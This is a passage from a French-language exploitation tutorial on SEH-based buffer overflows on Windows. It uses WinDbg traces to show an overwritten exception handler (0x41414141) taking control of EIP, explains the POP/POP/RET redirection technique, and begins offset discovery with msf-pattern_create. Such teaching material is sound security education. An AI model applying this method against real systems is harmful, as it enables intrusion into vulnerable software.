<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853aea</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f44c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0xe</span><span class="p">:</span>
<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="n">77853aea</span> <span class="n">64892500000000</span>  <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="p">:[</span><span class="n">0</span><span class="p">],</span><span class="n">esp</span> <span class="n">fs</span><span class="p">:</span><span class="n">003b</span><span class="p">:</span><span class="n">00000000</span><span class="p">=</span><span class="n">01c1fe1c</span>
<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">002b7000</span>
<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">01c1fe1c</span>
<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">01c20000</span>
<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>    <span class="n">StackLimit</span><span class="p">:</span>           <span class="n">01c1e000</span>
<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="p">[...]</span>
</code></pre></div>
<p>Cette étape permet d'anticiper les exceptions qui pourraient arriver durant l'appel du <em>_except_handler</em>.</p>
<h5 id="4-push">4 PUSH</h5>
<p>Enfin, quatre <code>push</code> correspondant aux quatre paramètres de la fonction <code>_except_handler</code> qui va être appelée par le <code>call</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">typedef</span><span class="w"> </span><span class="n">EXCEPTION_DISPOSITION</span><span class="w"> </span><span class="nf">_except_handler</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">PEXCEPTION_ROUTINE</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w">  </span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">PEXCEPTION_RECORD</span><span class="w"> </span><span class="n">ExceptionRecord</span><span class="p">,</span><span class="w">  </span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">VOID</span><span class="w"> </span><span class="n">EstablisherFrame</span><span class="p">,</span>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="n">PCONTEXT</span><span class="w"> </span><span class="n">ContextRecord</span><span class="p">,</span><span class="w"> </span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="n">PDISPATCHER_CONTEXT</span><span class="w"> </span><span class="n">DispatcherContext</span><span class="w">  </span>
<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="p">);</span>
</code></pre></div>
<ul>
<li>Les quatre <code>push</code> en assembleur :</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">77853af1</span> <span class="n">ff7514</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">14h</span><span class="p">]</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">77853af4</span> <span class="n">ff7510</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">10h</span><span class="p">]</span>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">77853af7</span> <span class="n">ff750c</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">0Ch</span><span class="p">]</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">77853afa</span> <span class="n">ff7508</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">8</span><span class="p">]</span>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="n">77853afd</span> <span class="n">8b4d18</span>          <span class="n">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">18h</span><span class="p">]</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">77853b00</span> <span class="n">ffd1</span>            <span class="n">call</span>    <span class="n">ecx</span>
</code></pre></div>
<p>On voit que <code>ExceptionList</code> est bien initialisée avec la même valeur que <code>ESP</code> suite au <code>mov</code> précédent :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853af1</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f44c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x15</span><span class="p">:</span>
<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="n">77853af1</span> <span class="n">ff7514</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">14h</span><span class="p">]</span>  <span class="n">ss</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">01c1f46c</span><span class="p">=</span><span class="n">01c1f4cc</span>
<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">002b7000</span>
<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">01c1f44c</span>
<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">01c20000</span>
<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>    <span class="n">StackLimit</span><span class="p">:</span>           <span class="n">01c1e000</span>
</code></pre></div>
<p>Les quatre (4) <code>push</code> utilisés ici pour initialiser les paramètres de la fonction</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853af4</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f448</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x18</span><span class="p">:</span>
<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="n">77853af4</span> <span class="n">ff7510</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">10h</span><span class="p">]</span>  <span class="n">ss</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">01c1f468</span><span class="p">=</span><span class="n">01c1f55c</span>
<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853af7</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x1b</span><span class="p">:</span>
<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="n">77853af7</span> <span class="n">ff750c</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">0Ch</span><span class="p">]</span>  <span class="n">ss</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">01c1f464</span><span class="p">=</span><span class="n">01c1ff54</span>
<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853afa</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f440</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x1e</span><span class="p">:</span>
<a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a><span class="n">77853afa</span> <span class="n">ff7508</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">8</span><span class="p">]</span>    <span class="n">ss</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">01c1f460</span><span class="p">=</span><span class="n">01c1f540</span>
<a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-26-20" name="__codelineno-26-20" href="#__codelineno-26-20"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-26-21" name="__codelineno-26-21" href="#__codelineno-26-21"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853afd</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f43c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-26-22" name="__codelineno-26-22" href="#__codelineno-26-22"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-26-23" name="__codelineno-26-23" href="#__codelineno-26-23"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x21</span><span class="p">:</span>
<a id="__codelineno-26-24" name="__codelineno-26-24" href="#__codelineno-26-24"></a><span class="n">77853afd</span> <span class="n">8b4d18</span>          <span class="n">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">18h</span><span class="p">]</span> <span class="n">ss</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">01c1f470</span><span class="p">=</span><span class="n">41414141</span>
<a id="__codelineno-26-25" name="__codelineno-26-25" href="#__codelineno-26-25"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-26-26" name="__codelineno-26-26" href="#__codelineno-26-26"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">41414141</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-26-27" name="__codelineno-26-27" href="#__codelineno-26-27"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853b00</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f43c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-26-28" name="__codelineno-26-28" href="#__codelineno-26-28"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-26-29" name="__codelineno-26-29" href="#__codelineno-26-29"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x24</span><span class="p">:</span>
<a id="__codelineno-26-30" name="__codelineno-26-30" href="#__codelineno-26-30"></a><span class="n">77853b00</span> <span class="n">ffd1</span>            <span class="n">call</span>    <span class="n">ecx</span> <span class="p">{</span><span class="n">41414141</span><span class="p">}</span>
</code></pre></div>
<p>Ce code ASM est donc bien le code qui finis par appeler la fonction <code>_except_handler</code> et nous donne le contrôle de <code>EIP</code>.</p>
<h3 id="execution-de-code-a-distance">Exécution de code à distance</h3>
<p>Contrairement aux dépassements de tampon basés sur la pile, on ne contrôle pas la pile. Malgré notre contrôle de <code>EIP</code> on ne peut pas le faire pointer vers une adresse contenant une instruction du type <code>JMP ESP</code> pour rediriger le flot d'exécution vers notre <em>payload</em>.</p>
<p>Au moment où notre fonction handler va être appelée, la pile va contenir</p>
<ul>
<li>L'adresse de retour</li>
<li>Les quatre (4) arguments de la fonction <code>_except_handler</code></li>
</ul>
<p>Rappel de la déclaration de la fonction :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="k">typedef</span><span class="w"> </span><span class="n">EXCEPTION_DISPOSITION</span><span class="w"> </span><span class="n">_except_handler</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">PEXCEPTION_ROUTINE</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w">  </span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">PEXCEPTION_RECORD</span><span class="w"> </span><span class="n">ExceptionRecord</span><span class="p">,</span><span class="w">  </span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="w">    </span><span class="c1">// pointe sur la structure _EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">VOID</span><span class="w"> </span><span class="n">EstablisherFrame</span><span class="p">,</span>
<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="n">PCONTEXT</span><span class="w"> </span><span class="n">ContextRecord</span><span class="p">,</span><span class="w"> </span>
<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="w">    </span><span class="n">IN</span><span class="w"> </span><span class="n">OUT</span><span class="w"> </span><span class="n">PDISPATCHER_CONTEXT</span><span class="w"> </span><span class="n">DispatcherContext</span><span class="w">  </span>
<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="p">);</span><span class="w"> </span>
</code></pre></div>
<p>C'est le deuxième argument, <code>EstablisherFrame</code>, qui est passé à la fonction <em>handler</em> qui pointe sur notre <em>payload</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c">#</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">dds</span> <span class="n">esp</span> <span class="n">L5</span>
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="n">01bcf438</span>  <span class="n">01bcfb02</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x26</span>   <span class="c"># Adresse de retour</span>
<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="n">01bcf43c</span>  <span class="n">01bcf540</span>                              <span class="c"># Paramètre ExceptionRecord</span>
<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="n">01bcf440</span>  <span class="n">01bcff54</span>                              <span class="c"># Paramètre EstablisherFrame</span>
<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="n">01bcf444</span>  <span class="n">01bcf55c</span>
<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="n">01bcf448</span>  <span class="n">01bcf4cc</span>
<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="c">#</span>
<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">dt</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span> <span class="n">01bcff54</span>
<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>   <span class="p">+</span><span class="n">0x000</span> <span class="n">Next</span>             <span class="p">:</span> <span class="n">0x41414141</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>   <span class="p">+</span><span class="n">0x004</span> <span class="n">Handler</span>          <span class="p">:</span> <span class="n">0x41414141</span>     <span class="n">_EXCEPTION_DISPOSITION</span>  <span class="p">+</span><span class="n">41414141</span>
<a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a><span class="c">#</span>
<a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="n">01bcff54</span>
<a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a><span class="n">01bcff54</span>  <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>
<a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a><span class="p">[...]</span>
</code></pre></div>
<p>Pour rediriger le flot d'exécution vers notre <em>payload</em> on pourrait réécrire l'<em>exception handler</em> avec l'adresse d'une instruction qui renvoie l'adresse de <code>EstablisherFrame</code> sur la pile.</p>
<p>La séquence d'instruction la plus commune utilisée dans les <em>SEH overflow</em> est :</p>
<ul>
<li><code>POP R32</code> : Retrouve la dernière valeur déposée dans la pile et la stock dans le registre en paramètre<ul>
<li>Ici l'adresse de retour de <code>ExecuteHandler2</code></li>
</ul>
</li>
<li><code>POP R32</code> : Retrouve la dernière valeur déposée dans la pile et la stock dans le registre en paramètre<ul>
<li>Ici le paramètre <code>ExceptionRecord</code></li>
</ul>
</li>
<li><code>RET</code> : Transfert le contrôle à l'adresse stockée sur la pile</li>
</ul>
<p>Cependant, avant de chercher pour la séquence d'instruction <code>POP</code>, <code>POP</code>, <code>RET</code> (P/P/R) on doit déterminer l'offset exact pour réécrire l'<em>exception handler</em> sur la pile.</p>
<h3 id="determiner-loffset-exact">Déterminer l'offset exact</h3>
<p>On doit déterminer la taille exact nécessaire pour écraser précisément le gestionnaire d'exception. Pour cela on va envoyer une chaine de caractère non répétitive qui permet d'identifier instantanément la position des 4 <em>bytes</em>. On utilise l'outil <code>msf-pattern_create</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="p">$</span> <span class="n">msf-pattern_create</span> <span class="n">-l</span> <span class="n">1000</span>
